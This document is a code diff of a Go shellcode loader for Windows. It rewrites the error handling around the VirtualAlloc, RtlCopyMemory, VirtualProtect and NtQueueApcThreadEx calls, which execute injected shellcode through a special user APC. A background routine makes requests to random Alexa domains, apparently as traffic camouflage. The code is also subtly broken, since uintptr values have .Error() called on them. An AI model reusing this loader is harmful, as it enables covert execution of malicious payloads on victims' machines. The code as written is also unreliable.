@@ -52,13 +52,13 @@ func main() {
 	if *debug {
 		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode...")
 	}
-	var addr, _, errVirtualAlloc uintptr = VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	var ret, _, errVirtualAlloc uintptr = VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 
-	if errVirtualAlloc!= nil && errVirtualAlloc.Error()!= "The operation completed successfully." {
+	if errVirtualAlloc!= nil {
 		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
 	}
 
-	if addr == 0 {
+	if ret == 0 {
 		log.Fatal("[!]VirtualAlloc failed and returned 0")
 	}
 
@@ -69,9 +69,9 @@ func main() {
 	if *debug {
 		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory...")
 	}
-	var _, _, errRtlCopyMemory uintptr = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	var _, _, errRtlCopyMemory uintptr = RtlCopyMemory.Call(ret, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 
-	if errRtlCopyMemory!= nil && errRtlCopyMemory.Error()!= "The operation completed successfully." {
+	if errRtlCopyMemory!= nil {
 		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
 	}
 	if *verbose {
@@ -82,8 +82,8 @@ func main() {
 		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...")
 	}
 	var oldProtect = PAGE_READWRITE
-	var _, _, errVirtualProtect uintptr = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE, uintptr(unsafe.Pointer(&oldProtect)))
-	if errVirtualProtect!= nil && errVirtualProtect.Error()!= "The operation completed successfully." {
+	var _, _, errVirtualProtect uintptr = VirtualProtect.Call(ret, uintptr(len(shellcode)), PAGE_EXECUTE, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtect!= nil {
 		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
 	}
 	if *verbose {
@@ -94,8 +94,8 @@ func main() {
 		fmt.Println("[DEBUG]Calling GetCurrentThread...")
 	}
 	var thread, _, err uintptr = GetCurrentThread.Call()
-	if err.Error()!= "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling GetCurrentThread:\n%s", err))
+	if err != 0 {
+		log.Fatal(fmt.Sprintf("Error calling GetCurrentThread:\n%s", err.Error()))
 	}
 	if *verbose {
 		fmt.Printf("[-]Got handle to current thread: %v\n", thread)
@@ -104,9 +104,9 @@ func main() {
 	if *debug {
 		fmt.Println("[DEBUG]Calling NtQueueApcThreadEx...")
 	}
-	var _, _, e uintptr = NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)
-	if e.Error()!= "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThreadEx:\n%s", e))
+	var _, _, e uintptr = NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, ret, 0, 0, 0)
+	if e != 0 {
+		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThreadEx:\n%s", e.Error()))
 	}
 	if *verbose {
 		fmt.Println("[-]Queued special user APC")
@@ -124,7 +124,7 @@ func periodicNetworkRequests() {
 
 	for range ticker.C {
 		rand.Seed(time.Now().UnixNano())
-	domains := getRandomAlexaDomains(3)
+		domains := getRandomAlexaDomains(3)
 		wg := &sync.WaitGroup{}
 		wg.Add(len(domains))
 
